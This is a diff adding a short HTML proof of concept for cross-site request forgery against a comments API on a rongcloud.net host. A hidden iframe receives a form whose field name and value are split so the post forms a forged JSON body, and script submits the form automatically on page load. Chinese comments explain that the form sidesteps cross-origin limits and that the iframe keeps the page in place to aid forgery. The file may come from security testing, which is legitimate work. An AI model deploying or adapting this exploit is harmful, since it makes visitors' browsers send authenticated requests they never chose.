@@ -1,0 +1,18 @@
+<html>
+     <body>
+          <iframe name="dy" style="display:none"></iframe>
+
+          <form action="https://rce-df.rongcloud.net/api/pins/Gep_F2ecRPMnvFdgpGS0sk/comments" method="post" enctype="" target="dy" id="form1" >
+               <input type="text" name='{"comment": "77788988' value='"}'>
+               <input type="submit" formenctype='application/json' id="submitBtn" value="123">
+          </form>
+          <script type="text/javascript">
+               //1、使用form表单可以解决，ajax POST请求的跨域问题。
+               //2、form表单提交到iframe中，可以使请求提交后，当前页面继续驻留到本页，方便后续脚本的执行，便于伪造。
+               document.getElementById("submitBtn").click();
+               // alert(11);
+               //location.href="http://www.rongcloud.cn";
+          </script>
+     </body>
+</html>
+
